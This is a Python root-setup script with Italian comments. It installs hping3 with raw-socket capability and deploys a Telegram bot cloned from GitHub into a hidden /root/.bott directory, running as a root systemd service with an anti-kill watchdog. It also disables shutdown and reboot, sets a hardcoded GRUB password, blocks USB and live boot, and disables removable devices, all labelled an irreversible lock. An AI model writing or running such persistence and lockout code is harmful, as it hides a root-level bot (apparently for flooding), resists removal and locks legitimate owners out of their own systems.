#!/usr/bin/env python3
import os
import sys
import subprocess
import pexpect

def run(cmd, fatal=False):
    print(f"[+] {cmd}")
    r = subprocess.run(cmd, shell=True)
    if fatal and r.returncode != 0:
        print("[!] ERRORE FATALE")
        sys.exit(1)

# =============================
# REQUIRE ROOT
# =============================
if os.geteuid() != 0:
    print("Devi eseguire questo script come root")
    sys.exit(1)

# =============================
# 1. Dipendenze
# =============================
run("apt update", fatal=True)
run(
    "apt install -y hping3 git curl build-essential libssl-dev zlib1g-dev "
    "libncurses5-dev libffi-dev libreadline-dev python3-pexpect",
    fatal=True
)

# =============================
# 2. hping3 cap
# =============================
if os.path.exists("/usr/sbin/hping3"):
    run("setcap cap_net_raw+ep /usr/sbin/hping3")

# =============================
# 3. PATH
# =============================
with open("/root/.bashrc", "a") as f:
    f.write("\nexport PATH=$PATH:/sbin:/usr/sbin\n")

# =============================
# 4. systemd power lock
# =============================
for t in [
    "ctrl-alt-del.target",
    "poweroff.target",
    "reboot.target",
    "suspend.target",
    "hibernate.target"
]:
    run(f"systemctl mask {t}")

# =============================
# 4.5 logind
# =============================
logind = "/etc/systemd/logind.conf"
lines = []
if os.path.exists(logind):
    with open(logind) as f:
        lines = f.readlines()

def set_conf(k, v):
    for i,l in enumerate(lines):
        if l.strip().startswith(k):
            lines[i] = f"{k}={v}\n"
            return
    lines.append(f"{k}={v}\n")

set_conf("HandlePowerKey", "ignore")
set_conf("HandleRebootKey", "ignore")
set_conf("HandleSuspendKey", "ignore")
set_conf("KillUserProcesses", "no")

with open(logind, "w") as f:
    f.writelines(lines)

run("systemctl daemon-reexec")
run("systemctl restart systemd-logind")

# =============================
# 4.6 GRUB LOCK (FINALE)
# =============================
GRUB_PASSWORD = "kali55757"
GRUB_CUSTOM = "/etc/grub.d/40_custom"

print("[+] Generazione hash GRUB")

child = pexpect.spawn("grub-mkpasswd-pbkdf2", encoding="utf-8", timeout=30)
child.expect(r"[Pp]assword")
child.sendline(GRUB_PASSWORD)
child.expect(r"[Pp]assword")
child.sendline(GRUB_PASSWORD)
child.expect(pexpect.EOF)

output = child.read()
hash_value = None
for line in output.splitlines():
    if "grub.pbkdf2" in line:
        hash_value = line.strip().split()[-1]
        break

if not hash_value:
    print("ERRORE FATALE: hash GRUB non trovato")
    print(output)
    sys.exit(1)

grub_cfg = f"""set superusers="root"
password_pbkdf2 root {hash_value}
"""

run(f'echo "{grub_cfg}" | tee {GRUB_CUSTOM} > /dev/null', fatal=True)
run("update-grub", fatal=True)

# =============================
# 5. Python 3.10
# =============================
run("cd /usr/src && curl -O https://www.python.org/ftp/python/3.10.14/Python-3.10.14.tgz", fatal=True)
run("cd /usr/src && tar xzf Python-3.10.14.tgz", fatal=True)
run("cd /usr/src/Python-3.10.14 && ./configure --enable-optimizations", fatal=True)
run("cd /usr/src/Python-3.10.14 && make -j$(nproc)", fatal=True)
run("cd /usr/src/Python-3.10.14 && make altinstall", fatal=True)

# =============================
# 6. pip + bot
# =============================
run("/usr/local/bin/python3.10 -m ensurepip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install python-telegram-bot==13.15", fatal=True)
run("cd /root && git clone https://github.com/troiarcazzoguardi-dev/bott.git")

if os.path.exists("/root/bott"):
    run("mv /root/bott /root/.bott")
    run("chmod 711 /root/.bott")

# =============================
# 7. systemd bot service
# =============================
with open("/etc/systemd/system/bott.service", "w") as f:
    f.write("""[Unit]
Description=Telegram Bot
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.bott
ExecStart=/usr/local/bin/python3.10 /root/.bott/bott.py
Restart=always

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott")
run("systemctl start bott")

# =============================
# 8. LOCK IRREVERSIBILE BOOT USB / LIVE
# =============================
print("[+] Lock irreversibile boot USB/Live")

run("grub-editenv /boot/grub/grubenv set boot_usb=0")
run("chmod 600 /boot/grub/grubenv")
run("chattr +i /boot/grub/grubenv")

for dev in ["/dev/sdb", "/dev/sdc", "/dev/fd0"]:
    run(f"chmod 000 {dev}", fatal=False)

# =============================
# 9. WATCHDOG ANTI-KILL BOT
# =============================
print("[+] Watchdog anti-kill del bot")

watchdog_service = "/etc/systemd/system/bott-watchdog.service"
with open(watchdog_service, "w") as f:
    f.write("""[Unit]
Description=Watchdog Bot Service
After=bott.service

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do systemctl is-active --quiet bott || systemctl restart bott; sleep 10; done'
Restart=always

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott-watchdog.service")
run("systemctl start bott-watchdog.service")

print("\n[✓] SISTEMA LOCKATO – GRUB PROTETTO – LOCK IRREVERSIBILE – BOT ATTIVO – WATCHDOG ATTIVO")
